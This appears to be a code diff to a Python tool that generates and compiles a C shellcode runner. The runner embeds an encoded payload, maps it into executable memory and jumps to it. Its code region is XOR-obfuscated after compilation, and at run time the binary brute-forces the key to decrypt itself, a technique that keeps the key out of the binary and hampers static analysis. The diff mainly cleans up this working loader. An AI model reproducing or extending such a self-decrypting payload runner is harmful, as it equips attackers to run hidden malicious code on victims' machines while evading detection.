@@ -43,6 +43,7 @@ def generate_runner_c(encoded_payload, arch, raw_payload):
     The runner includes a self-decrypt routine that brute-forces a weak XOR key
     (0x42) until the decrypted marker ("DECO") appears.
     """
+    # Note: We forward-declare __decrypt_end so it can be used in self_decrypt_region.
     c_code = f'''\
 #include <stdio.h>
 #include <stdlib.h>
@@ -52,8 +53,10 @@ def generate_runner_c(encoded_payload, arch, raw_payload):
 
 #define WEAK_KEY 0x42
 
-// The following items are placed in a dedicated section ".decrypted"
-// so that the self-decrypting region is contiguous.
+// Forward declaration for __decrypt_end.
+extern char __decrypt_end[];
+
+// Place the following items in the ".decrypted" section to enforce contiguity.
 __attribute__((section(".decrypted")))
 char __decrypt_start[] = "DECO_START";
 
@@ -63,26 +66,21 @@ char __decrypt_marker[] = "DECO";
 // Self-decryption routine.
 // This function brute-forces the XOR key for the region between __decrypt_start and __decrypt_end.
 void self_decrypt_region() {{
-    // Calculate the region to decrypt.
     unsigned char *start = (unsigned char *)__decrypt_start;
     unsigned char *end = (unsigned char *)__decrypt_end;
     size_t region_size = end - start;
     int key;
     for (key = 0; key < 256; key++) {{
-        // Make a temporary copy of the region.
         unsigned char temp[region_size];
         memcpy(temp, start, region_size);
-        // XOR decrypt with candidate key.
         for (size_t i = 0; i < region_size; i++) {{
             temp[i] ^= key;
         }}
-        // Check if the decrypted marker (first 4 bytes) matches __decrypt_marker.
         if (memcmp(temp, __decrypt_marker, 4) == 0) {{
-            // Found correct key. Now decrypt the region in place.
             for (size_t i = 0; i < region_size; i++) {{
                 start[i] ^= key;
             }}
-            // Optionally print the found key.
+            // Uncomment for debugging:
             // printf("Self-decryption key found: 0x%02x\\n", key);
             return;
         }}
@@ -105,14 +103,13 @@ void runner_entry() {{
 #if defined(__i386__) || defined(__x86_64__)
     __builtin___clear_cache((char*)exec_mem, (char*)exec_mem + payload_size);
 #endif
-    // Transfer control to the payload.
     void (*payload_func)() = exec_mem;
     payload_func();
     exit(0);
 }}
 
 __attribute__((section(".decrypted")))
-char __decrypt_end[]   = "DECO_END";
+char __decrypt_end[] = "DECO_END";
 
 // Embedded encoded payload.
 unsigned char encoded_payload[] = {{
@@ -121,7 +118,6 @@ unsigned char encoded_payload[] = {{
 size_t payload_size = sizeof(encoded_payload);
 
 int main(int argc, char *argv[]) {{
-    // Call the runner entry point in the self-decrypting region.
     runner_entry();
     return 0;
 }}
@@ -151,10 +147,9 @@ def compile_runner(c_source, arch, output_filename):
 def postprocess_runner(runner_filename):
     """
     Post-process the compiled ELF runner.
-    This function opens the runner binary, locates the region between the markers
+    Opens the runner binary, locates the region between the markers
     "DECO_START" and "DECO_END", and XORs that region with a weak key (0x42).
-    The final ELF will not contain the decryption key explicitly; the runner
-    will brute-force it at runtime.
+    The final ELF does not contain the decryption key; the runner will brute-force it at runtime.
     """
     with open(runner_filename, "rb") as f:
         data = bytearray(f.read())
@@ -164,7 +159,6 @@ def postprocess_runner(runner_filename):
     end_idx = data.find(marker_end)
     if start_idx == -1 or end_idx == -1 or end_idx <= start_idx:
         sys.exit("Failed to locate decryption markers in the runner binary.")
-    # XOR the region from marker start to marker end with the weak key.
     for i in range(start_idx, end_idx):
         data[i] ^= 0x42
     with open(runner_filename, "wb") as f:
